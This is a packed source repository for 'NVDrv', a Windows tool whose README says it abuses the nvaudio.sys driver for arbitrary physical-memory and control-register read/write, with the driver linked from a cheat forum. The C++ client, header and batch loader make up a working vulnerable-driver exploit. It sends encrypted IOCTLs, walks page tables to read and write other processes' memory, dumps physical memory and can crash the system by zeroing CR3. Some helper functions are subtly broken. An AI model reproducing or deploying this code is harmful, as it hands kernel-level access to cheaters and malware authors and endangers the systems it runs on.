Project Path: arc_gmh5225_NVDrv_f6921ni1

Source Tree:

```txt
arc_gmh5225_NVDrv_f6921ni1
├── LoadDriver.bat
├── NVDrv.cpp
├── NVDrv.h
├── NVDrv.sln
├── NVDrv.vcxproj
├── NVDrv.vcxproj.filters
├── README.md
├── main.cpp
└── nvaudio.sys

```

`LoadDriver.bat`:

```bat
@echo off
cd %~dp0

xcopy nvaudio.sys C:\
sc create nvaudio binpath=C:\nvaudio.sys type=kernel
sc start nvaudio

echo Press any key to unload driver
pause

sc stop nvaudio
sc delete nvaudio
del /f C:\nvaudio.sys

pause
```

`NVDrv.cpp`:

```cpp
#include "NVDrv.h"

uintptr_t NVDrv::MmGetPhysicalAddress(uintptr_t virtual_address)
{
	request_phys_addr Request{};

	Request.request_id = NVFunction::phys_req;
	Request.result_addr = 0;
	Request.virtual_addr = virtual_address;

	this->encrypt_payload(&Request, 0x38, Request.packet_key);

	DWORD BytesReturned{};

	auto status = DeviceIoControl(this->nvhandle, ioctl_code, &Request, 0x138u, &Request, 0x138, &BytesReturned, 0i64);

	if (!status)
	{
		if (DEBUG)
			printf("Failed VTOP for virtual address: %p!\n", (void*)virtual_address);

		return 0;
	}

	return Request.result_addr;
}

BOOL NVDrv::ReadPhysicalMemory(uintptr_t physical_address, void* OUT res, int size)
{
	request_memcpy Request{};

	Request.request_id = NVFunction::phys_read;
	Request.size = size;
	Request.dst_addr = (__int64)res;
	Request.src_addr = physical_address;

	this->encrypt_payload(&Request, 0x38, Request.packet_key);

	DWORD BytesReturned{};
	return DeviceIoControl(this->nvhandle, ioctl_code, &Request, 0x138u, &Request, 0x138, &BytesReturned, 0i64);
}

BOOL NVDrv::WritePhysicalMemory(uintptr_t physical_address, void* IN  res, int size)
{
	request_memcpy Request{};

	Request.request_id = NVFunction::phys_write;
	Request.size = size;
	Request.dst_addr = physical_address;
	Request.src_addr = (__int64)res;

	this->encrypt_payload(&Request, 0x38, Request.packet_key);

	DWORD BytesReturned{};
	return DeviceIoControl(this->nvhandle, ioctl_code, &Request, 0x138u, &Request, 0x138, &BytesReturned, 0i64);
}

BOOL NVDrv::SwapReadContext(uintptr_t target_cr3)
{
	if (!target_cr3)
		return FALSE;

	target_cr3 = this->target_cr3;

	return TRUE;
}

uintptr_t NVDrv::GetSystemCR3()
{
	for (int i = 0; i < 10; i++)
	{
		uintptr_t lpBuffer;
		if (!this->ReadPhysicalMemory(i * 0x10000, &lpBuffer, sizeof(uintptr_t)))
			continue;

		for (int uOffset = 0; uOffset < 0x10000; uOffset += 0x1000)
		{
			uintptr_t value1, value2, value3;

			if (!this->ReadPhysicalMemory(lpBuffer + uOffset, &value1, sizeof(uintptr_t)))
				continue;
			if (!this->ReadPhysicalMemory(lpBuffer + uOffset + 0x70, &value2, sizeof(uintptr_t)))
				continue;
			if (!this->ReadPhysicalMemory(lpBuffer + uOffset + 0xa0, &value3, sizeof(uintptr_t)))
				continue;

			if (0x00000001000600E9 ^ (0xffffffffffff00ff & value1))
				continue;
			if (0xfffff80000000000 ^ (0xfffff80000000000 & value2))
				continue;
			if (0xffffff0000000fff & value3)
				continue;

			return value3;
		}
	}

	return 0;
}

uintptr_t NVDrv::TranslateLinearToPhysicalAddress(uintptr_t virtual_address)
{
	unsigned short PML4 = (unsigned short)((virtual_address >> 39) & 0x1FF);
	uintptr_t PML4E = 0;
	this->ReadPhysicalMemory((this->target_cr3 + PML4 * sizeof(uintptr_t)), &PML4E, sizeof(PML4E));

	unsigned short DirectoryPtr = (unsigned short)((virtual_address >> 30) & 0x1FF);
	uintptr_t PDPTE = 0;
	this->ReadPhysicalMemory(((PML4E & 0xFFFFFFFFFF000) + DirectoryPtr * sizeof(uintptr_t)), &PDPTE, sizeof(PDPTE));

	if ((PDPTE & (1 << 7)) != 0)
		return (PDPTE & 0xFFFFFC0000000) + (virtual_address & 0x3FFFFFFF);

	unsigned short Directory = (unsigned short)((virtual_address >> 21) & 0x1FF);

	uintptr_t PDE = 0;
	this->ReadPhysicalMemory(((PDPTE & 0xFFFFFFFFFF000) + Directory * sizeof(uintptr_t)), &PDE, sizeof(PDE));

	if (PDE == 0)
		return 0;

	if ((PDE & (1 << 7)) != 0)
	{
		return (PDE & 0xFFFFFFFE00000) + (virtual_address & 0x1FFFFF);
	}

	unsigned short Table = (unsigned short)((virtual_address >> 12) & 0x1FF);
	uintptr_t PTE = 0;

	this->ReadPhysicalMemory(((PDE & 0xFFFFFFFFFF000) + Table * sizeof(uintptr_t)), &PTE, sizeof(PTE));

	if (PTE == 0)
		return 0;

	return (PTE & 0xFFFFFFFFFF000) + (virtual_address & 0xFFF);
}

BOOL NVDrv::ReadVirtualMemory(uintptr_t address, LPVOID output, unsigned long size)
{
	if (!address || !size)
		return FALSE;

	uintptr_t PhysicalAddress = this->TranslateLinearToPhysicalAddress(address);

	if (!PhysicalAddress)
		return FALSE;

	if (!this->ReadPhysicalMemory(PhysicalAddress, output, size))
	{
		if (DEBUG)
			printf("Failed ReadVirtualMemory for address: %p!\n", (void*)address);

		return FALSE;
	}

	return TRUE;
}

BOOL NVDrv::WriteVirtualMemory(uintptr_t address, LPVOID data, unsigned long size)
{
	if (!address || !data)
		return FALSE;

	uintptr_t PhysicalAddress = this->TranslateLinearToPhysicalAddress(address);

	if (!PhysicalAddress)
		return FALSE;

	if (!this->WritePhysicalMemory(PhysicalAddress, data, size))
	{
		if (DEBUG)
			printf("Failed WriteVirtualMemory for address: %p!\n", (void*)address);

		return FALSE;

	}
	return TRUE;
}

DWORD NVDrv::ReadCr(int cr)
{
	request_readcr Request{};

	Request.request_id = NVFunction::read_cr;
	Request.cr_num = cr;
	Request.unk_0 = 4;

	this->encrypt_payload(&Request, 0x38, Request.packet_key);

	DWORD BytesReturned{};
	auto status = DeviceIoControl(this->nvhandle, ioctl_code, &Request, 0x138u, &Request, 0x138, &BytesReturned, 0i64);

	if (!status)
		return 0;

	return Request.result;
}

BOOL NVDrv::WriteCr(int cr, DWORD64 value)
{
	request_writecr Request{};

	Request.request_id = NVFunction::write_cr;
	Request.cr_num = cr;
	Request.writevalue = value;
	Request.unk_0 = 4;

	this->encrypt_payload(&Request, 0x38, Request.packet_key);

	DWORD BytesReturned{};
	return DeviceIoControl(this->nvhandle, ioctl_code, &Request, 0x138u, &Request, 0x138, &BytesReturned, 0i64);
}

std::wstring NVDrv::GetProcessPath(const std::wstring& processName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (hSnapshot == INVALID_HANDLE_VALUE) {
		return L"";
	}

	PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
	if (Process32First(hSnapshot, &processEntry)) {
		do {
			if (_wcsicmp(processEntry.szExeFile, processName.c_str()) == 0) {
				CloseHandle(hSnapshot);

				HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processEntry.th32ProcessID);
				if (hProcess != nullptr) {
					wchar_t buffer[MAX_PATH];
					DWORD bufferSize = MAX_PATH;

					if (QueryFullProcessImageName(hProcess, 0, buffer, &bufferSize)) {
						CloseHandle(hProcess);
						return buffer;
					}

					CloseHandle(hProcess);
				}

				return L"";
			}
		} while (Process32Next(hSnapshot, &processEntry));
	}

	CloseHandle(hSnapshot);

	return L"";
}

uintptr_t NVDrv::GetProcessBase(const std::wstring& processName)
{
	return (uintptr_t)LoadLibrary(this->GetProcessPath(processName).c_str());
}

uintptr_t NVDrv::GetProcessCR3(uintptr_t base_address)
{
	if (!base_address) {
		return 0;
	}

	uintptr_t NtdllAddress = reinterpret_cast<uintptr_t>(GetModuleHandleA("ntdll.dll"));
	if (!NtdllAddress) {
		return 0;
	}

	uintptr_t CurrentCR3 = this->ReadCr(NVControlRegisters::CR3);
	if (!CurrentCR3) {
		return 0;
	}

	this->SwapReadContext(CurrentCR3);

	uintptr_t NtdllPhysicalAddress = this->TranslateLinearToPhysicalAddress(NtdllAddress);

	for (uintptr_t i = 0; i != 0x50000000; i++)
	{
		uintptr_t CR3 = i << 12;

		if (CR3 == CurrentCR3)
			continue;

		this->SwapReadContext(CR3);

		uintptr_t PhysicalAddress = this->TranslateLinearToPhysicalAddress(NtdllAddress);

		if (!PhysicalAddress)
			continue;

		if (PhysicalAddress == NtdllPhysicalAddress)
		{
			this->SwapReadContext(CR3);

			const char Bytes = this->Read<char>(base_address);

			if (Bytes == 0x4D)
			{
				if (DEBUG)
					printf("GetProcessCR3: %p\n", (void*)CR3);

				this->SwapReadContext(CR3);

				break;
			}
		}
	}

	FreeLibrary(reinterpret_cast<HMODULE>(NtdllAddress));

	return 0;
}
```

`NVDrv.h`:

```h
#pragma once
#include <Windows.h>
#include <iostream>
#include <tlhelp32.h>

struct NVDrv
{

public:
    DWORD                   ReadCr(int cr);
    BOOL                    WriteCr(int cr, DWORD64 value);

    std::wstring            GetProcessPath(const std::wstring& processName);
    uintptr_t               GetProcessBase(const std::wstring& processName);
    uintptr_t               GetProcessCR3(uintptr_t base_address);
    uintptr_t               GetSystemCR3();

    uintptr_t               MmGetPhysicalAddress(uintptr_t virtual_address);
    uintptr_t               TranslateLinearToPhysicalAddress(uintptr_t virtual_address);


    BOOL                    ReadPhysicalMemory(uintptr_t physical_address, void* OUT res, int size);
    BOOL                    WritePhysicalMemory(uintptr_t physical_address, void* IN  res, int size);

    BOOL                    ReadVirtualMemory(uintptr_t address, LPVOID output, unsigned long size);
    BOOL                    WriteVirtualMemory(uintptr_t address, LPVOID data, unsigned long size);

    BOOL                    SwapReadContext(uintptr_t target_cr3);

    NVDrv()
    {
        HMODULE nvaudio = LoadLibraryW(L"C:\\nvaudio.sys");

        if (!nvaudio)
        {
            printf("nvaudio.sys not found at C: directory!\n");
            exit(5000);
        }

        encrypt_payload = (decltype(encrypt_payload))(__int64(nvaudio) + 0x2130);

        this->nvhandle = CreateFileW(L"\\\\.\\NVR0Internal", GENERIC_READ | GENERIC_WRITE, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);

        if (this->nvhandle != INVALID_HANDLE_VALUE) {
            printf("NVR0Internal Handle: %p\n", this->nvhandle);
        }
        else {
            printf("Driver is not loaded!\n");
            exit(5000);
        }
    }

    template<typename T>
    T Read(uintptr_t address)
    {
        T buffer;

        if (!ReadVirtualMemory(address, &buffer, sizeof(T)))
            return NULL;

        return buffer;
    }

    template<typename T>
    BOOL Write(uintptr_t address, T val)
    {
        if (!WriteVirtualMemory(address, (LPVOID)&val, sizeof(T)))
            return FALSE;

        return TRUE;

    }

    enum NVControlRegisters {
        CR0 = 0,
        CR2 = 2,
        CR3 = 3,
        CR4 = 4
    };

private:
#define DEBUG TRUE
    static int constexpr ioctl_code = 0x9C40A484;

    enum class NVFunction : int
    {
        read_cr = 0,
        write_cr = 1,
        phys_req = 0x26,
        phys_read = 0x14,
        phys_write = 0x15
    };

    struct request { };

    struct request_memcpy : request
    {
        NVFunction request_id;
        int size;
        __int64 dst_addr;
        __int64 src_addr;
        char unk[0x20];
        unsigned __int64 packet_key[0x40 / 8];
        char unk_data[0x138 - 0x40 - 56];
    };

    struct request_phys_addr : request
    {
        NVFunction request_id;
        int unk_0;
        __int64 result_addr;
        __int64 virtual_addr;
        int writevalue;
        char unk[0x20 - 4];
        unsigned __int64 packet_key[0x40 / 8];
        char unk_data[0x138 - 0x40 - 56];
    };
    
    struct request_readcr : request
    {
        NVFunction request_id;
        int unk_0;
        int cr_num;
        int unk10;
        int unk14;
        int unk18;
        int result;
        char unk[0x20 - 4];
        unsigned __int64 packet_key[0x40 / 8] = { 12868886329971960498, 13552922889676271240, 10838534925730813900, 11819403095038824665,16047435637536096 ,10679697536739367056 ,18271467892729589711 ,6472933704646412218 };;
        char unk_data[0x138 - 0x40 - 56];
    };

    struct request_writecr : request
    {
        NVFunction request_id;
        int unk_0;
        int cr_num;
        int unk10;
        int unk14;
        int unk18;
        int writevalue;
        char unk[0x20 - 4];
        unsigned __int64 packet_key[0x40 / 8];
        char unk_data[0x138 - 0x40 - 56];
    };

    void* (*encrypt_payload)(request* data_crypt, int, void* temp_buf) = nullptr;
    HANDLE nvhandle = INVALID_HANDLE_VALUE;
    uintptr_t target_cr3 = 0;
};
```

`NVDrv.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.6.33829.357
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "NVdrv", "NVdrv.vcxproj", "{DFD7A590-5B32-4193-88D3-A6E3EE183118}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{DFD7A590-5B32-4193-88D3-A6E3EE183118}.Debug|x64.ActiveCfg = Debug|x64
		{DFD7A590-5B32-4193-88D3-A6E3EE183118}.Debug|x64.Build.0 = Debug|x64
		{DFD7A590-5B32-4193-88D3-A6E3EE183118}.Debug|x86.ActiveCfg = Debug|Win32
		{DFD7A590-5B32-4193-88D3-A6E3EE183118}.Debug|x86.Build.0 = Debug|Win32
		{DFD7A590-5B32-4193-88D3-A6E3EE183118}.Release|x64.ActiveCfg = Release|x64
		{DFD7A590-5B32-4193-88D3-A6E3EE183118}.Release|x64.Build.0 = Release|x64
		{DFD7A590-5B32-4193-88D3-A6E3EE183118}.Release|x86.ActiveCfg = Release|Win32
		{DFD7A590-5B32-4193-88D3-A6E3EE183118}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {73B5FA26-8292-4065-BFD1-DD0625EE0899}
	EndGlobalSection
EndGlobal

```

`NVDrv.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{dfd7a590-5b32-4193-88d3-a6e3ee183118}</ProjectGuid>
    <RootNamespace>NVdrv</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
    <ProjectName>NVDrv</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <LanguageStandard>stdcpp20</LanguageStandard>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp" />
    <ClCompile Include="NVDrv.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="NVDrv.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`NVDrv.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="NVDrv.cpp">
      <Filter>Header Files</Filter>
    </ClCompile>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="NVDrv.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`README.md`:

```md
# NVDrv

Abusing nvaudio.sys for arbitrary (read/write)/s to physical memory, control registers (CR0 - CR4 and more), MSRs (not implemented yet into example source yet).

nvaudio.sys download: https://www.unknowncheats.me/forum/downloads.php?do=file&id=41635

```

`main.cpp`:

```cpp
#include "NVDrv.h"
#include <fstream>

void WriteFileToDisk(const char* file_name, uintptr_t buffer, DWORD size)
{
	std::ofstream File(file_name, std::ios::binary);
	File.write((char*)buffer, size);
	File.close();
}

int main()
{
	NVDrv* NV = new NVDrv();

	DWORD CR0 = NV->ReadCr(NVDrv::NVControlRegisters::CR0);
	printf("CR0: %p\n", (void*)CR0);

	DWORD CR2 = NV->ReadCr(NVDrv::NVControlRegisters::CR2);
	printf("CR2: %p\n", (void*)CR2);

	DWORD CR3 = NV->ReadCr(NVDrv::NVControlRegisters::CR3);
	printf("CR3: %p\n", (void*)CR3);

	DWORD CR4 = NV->ReadCr(NVDrv::NVControlRegisters::CR4);
	printf("CR4: %p\n", (void*)CR4);

	uintptr_t ProcessBase = NV->GetProcessBase(L"explorer.exe");
	printf("ProcessBase: %p\n", (void*)ProcessBase);

	DWORD DumpSize = 0xFFFF;
	uintptr_t Allocation = (uintptr_t)VirtualAlloc(0, DumpSize, MEM_COMMIT, PAGE_READWRITE);

	for (int i = 0; i < (DumpSize / 8); i++)
		NV->ReadPhysicalMemory(i * 8, (uintptr_t*)(Allocation + i * 8), 8);

	WriteFileToDisk("PhysicalMemoryDump.bin", Allocation, DumpSize);

	if (Allocation)
		VirtualFree((void*)Allocation, 0, MEM_RELEASE);

	int Result = MessageBoxA(0, "BSOD via nulling CR3?", "Test", MB_YESNO);

	if (Result == IDYES)
		NV->WriteCr(NVDrv::NVControlRegisters::CR3, 0);

	/*
	// Disable KVA shadowing before continuing with this
	//
	auto SystemCR3 = NV->GetSystemCR3();
	printf("SystemCR3: %p\n", (void*)SystemCR3);

	auto ProcessCR3 = NV->GetProcessCR3(ProcessBase);
	printf("ProcessCR3: %p\n", (void*)ProcessCR3);

	*/

	Sleep(-1);
}

```